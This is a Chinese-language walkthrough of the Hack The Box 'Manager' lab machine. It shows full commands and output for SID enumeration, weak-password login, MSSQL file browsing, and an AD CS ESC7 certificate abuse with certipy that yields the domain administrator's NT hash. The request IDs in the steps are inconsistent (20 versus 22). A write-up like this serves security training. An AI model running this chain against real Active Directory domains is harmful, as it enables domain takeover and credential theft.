---
layout: post
title: HTB——Manager
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Manager/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-11 12:44:03] [INFO] 暴力破解线程数: 1
[2025-04-11 12:44:03] [INFO] 开始信息扫描
[2025-04-11 12:44:03] [INFO] 最终有效主机数量: 1
[2025-04-11 12:44:03] [INFO] 开始主机扫描
[2025-04-11 12:44:03] [INFO] 有效端口数量: 233
[2025-04-11 12:44:03] [SUCCESS] 端口开放 10.129.175.154:80
[2025-04-11 12:44:03] [SUCCESS] 端口开放 10.129.175.154:88
[2025-04-11 12:44:03] [SUCCESS] 端口开放 10.129.175.154:135
[2025-04-11 12:44:03] [SUCCESS] 端口开放 10.129.175.154:139
[2025-04-11 12:44:03] [SUCCESS] 端口开放 10.129.175.154:389
[2025-04-11 12:44:03] [SUCCESS] 端口开放 10.129.175.154:445
[2025-04-11 12:44:03] [SUCCESS] 端口开放 10.129.175.154:1433
[2025-04-11 12:44:09] [SUCCESS] 服务识别 10.129.175.154:88 => 
[2025-04-11 12:44:09] [SUCCESS] 服务识别 10.129.175.154:139 =>  Banner:[.]
[2025-04-11 12:44:09] [SUCCESS] 服务识别 10.129.175.154:445 => 
[2025-04-11 12:44:09] [SUCCESS] 服务识别 10.129.175.154:1433 => [ms-sql-s] 版本:15.00.$I(1,">") 产品:Microsoft SQL Server 2019 Banner:[.%.]                                                      
[2025-04-11 12:44:09] [SUCCESS] 服务识别 10.129.175.154:389 => 
[2025-04-11 12:44:09] [SUCCESS] 服务识别 10.129.175.154:80 => [http]
[2025-04-11 12:45:08] [SUCCESS] 服务识别 10.129.175.154:135 => 
[2025-04-11 12:45:09] [INFO] 存活端口数量: 7
[2025-04-11 12:45:09] [INFO] 开始漏洞扫描
[2025-04-11 12:45:09] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                            
[2025-04-11 12:45:09] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.175.154                                                                         
主机名: dc01                                                                                     
发现的网络接口:                                                                                  
   IPv4地址:                                                                                     
      └─ 10.129.175.154                                                                          
[2025-04-11 12:45:09] [SUCCESS] 网站标题 http://10.129.175.154     状态码:200 长度:18203  标题:Manager                                                                                            
[2025-04-11 12:45:58] [INFO] SMB2共享信息 10.129.175.154:445 admin Pass:123456 共享:[ADMIN$ C$ IPC$ NETLOGON SYSVOL]                                                                              
[2025-04-11 12:46:02] [SUCCESS] SMB认证成功 10.129.175.154:445 admin:123456
```

---

# 0x02 SID枚举域内用户

在SMB共享目录内没有发现有效信息，我们使用`enum4linux`工具来尝试探测有效信息。也没有获取到有效信息。参考`Rebound`靶机记录时发现我们可以通过传入任意用户名来实现域内的SID枚举。`ridenum`工具也可以达成相似效果，我们这里使用`impacket`工具实例。

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-lookupsid david@10.129.175.154 -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.175.154
[*] StringBinding ncacn_np:10.129.175.154[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: MANAGER\Administrator (SidTypeUser)
501: MANAGER\Guest (SidTypeUser)
502: MANAGER\krbtgt (SidTypeUser)
512: MANAGER\Domain Admins (SidTypeGroup)
513: MANAGER\Domain Users (SidTypeGroup)
514: MANAGER\Domain Guests (SidTypeGroup)
515: MANAGER\Domain Computers (SidTypeGroup)
516: MANAGER\Domain Controllers (SidTypeGroup)
517: MANAGER\Cert Publishers (SidTypeAlias)
518: MANAGER\Schema Admins (SidTypeGroup)
519: MANAGER\Enterprise Admins (SidTypeGroup)
520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
525: MANAGER\Protected Users (SidTypeGroup)
526: MANAGER\Key Admins (SidTypeGroup)
527: MANAGER\Enterprise Key Admins (SidTypeGroup)
553: MANAGER\RAS and IAS Servers (SidTypeAlias)
571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
1000: MANAGER\DC01$ (SidTypeUser)
1101: MANAGER\DnsAdmins (SidTypeAlias)
1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
1113: MANAGER\Zhong (SidTypeUser)
1114: MANAGER\Cheng (SidTypeUser)
1115: MANAGER\Ryan (SidTypeUser)
1116: MANAGER\Raven (SidTypeUser)
1117: MANAGER\JinWoo (SidTypeUser)
1118: MANAGER\ChinHae (SidTypeUser)
1119: MANAGER\Operator (SidTypeUser)
```

根据HTB提问，我们得到一个可用的域内账密`Operator:operator`

```bash
 ┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.129.175.154 -u Operator -p 'operator'
SMB         10.129.175.154  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.175.154  445    DC01             [+] manager.htb\Operator:operator
```

---

# 0x03 mssql上线获取敏感文件

接下来我们使用`impacket`套件的`mssqlclient`来连接靶机的mssql，并尝试读取靶机上的文件。

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-mssqlclient 'manager.htb/Operator:operator@10.129.175.154' -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```

通过翻看文件夹，我们发现了网站目录下的一个源码备份文件。

```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1 
```

将此文件薅下来，我们可以得到`Raven`的账密`R4v3nBe5tD3veloP3r!123`.使用winrm登录获取`user.txt`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Manager/02.png?raw=true)

接下来我们查询域内的证书颁发机构，并将其加入hosts

```bash
*Evil-WinRM* PS C:\Users\Raven\Documents> Get-ChildItem -Path Cert:\LocalMachine\My | Select-Object Subject, Issuer

Subject                                Issuer
-------                                ------
CN=manager-DC01-CA, DC=manager, DC=htb CN=manager-DC01-CA, DC=manager, DC=htb
                                       CN=manager-DC01-CA, DC=manager, DC=htb
```

---

# 0x04 攻击域内AD CS服务——ESC7

使用`certipy-ad`工具来扫描域内可用的ESC提权路径，结果如下

```bash
┌──(root㉿kali)-[/home/kali]
└─# certipy-ad find -u Raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -target-ip 10.129.175.154
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Saved BloodHound data to '20250411140102_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250411140102_Certipy.txt'
[*] Saved JSON output to '20250411140102_Certipy.json'

Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
```

我们使用`certipy-ad`完成此提权行为

- [AD CS Domain Escalation - HackTricks](https://book.hacktricks.wiki/zh/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)

```bash
┌──(root㉿kali)-[/home/kali]
└─# certipy-ad ca -ca manager-dc01-ca -add-officer Raven -username Raven -password 'R4v3nBe5tD3veloP3r!123' -target-ip 10.129.175.154 -dc-ip 10.129.175.154
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-dc01-ca'


┌──(root㉿kali)-[/home/kali]
└─# certipy-ad ca -username Raven -password 'R4v3nBe5tD3veloP3r!123' -target-ip 10.129.175.154 -ca 'manager-dc01-ca' -enable-template 'SubCA' -dc-ip 10.129.175.154
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-dc01-ca'


┌──(root㉿kali)-[/home/kali]
└─# certipy-ad ca -ca 'manager-dc01-ca' -enable-template SubCA -username Raven -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.175.154 -target-ip 10.129.175.154
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-dc01-ca'
```

接下来我们将请求SubCA的证书，此请求将会被拒绝，但我们需要的是此事件ID

```bash
┌──(root㉿kali)-[/home/kali]
└─# certipy-ad req -username Raven -password 'R4v3nBe5tD3veloP3r!123' -ca manager-dc01-ca -target-ip 10.129.175.154 -dc-ip 10.129.175.154 -template SubCA -upn administrator@manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 20
Would you like to save the private key? (y/N) y
[*] Saved private key to 20.key
[-] Failed to request certificate
```

获得请求ID为20.我们利用此请求ID签发失败的证书请求。

```bash
┌──(root㉿kali)-[/home/kali]
└─# certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.175.154 -ca manager-dc01-ca -issue-request 22
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

最后再次请求此证书，我们就能拿到administrator的pfx了

```bash
┌──(root㉿kali)-[/home/kali]
└─# certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-dc01-ca -target-ip 10.129.175.154 -dc-ip 10.129.175.154 -retrieve 22
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 22
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '22.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

注意certipy的auth模块需与DC时间严格一致，否则会导致无法请求到NTLM hash。这里我们更新了一下时间。

```bash
┌──(root㉿kali)-[/home/kali]
└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.175.154
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
                                                                             
┌──(root㉿kali)-[/home/kali]
└─# sudo ntpdate 10.129.175.154                             
2025-04-11 20:09:37.243086 (-0400) +20284.502825 +/- 0.072106 10.129.175.154 s1 no-leap
CLOCK: time stepped by 20284.502825
                                                                             
┌──(root㉿kali)-[/home/kali]
└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.175.154
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

拿到此NTLM hash后，我们就可以如愿以偿上线拿到`root.txt`了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Manager/03.png?raw=true)

---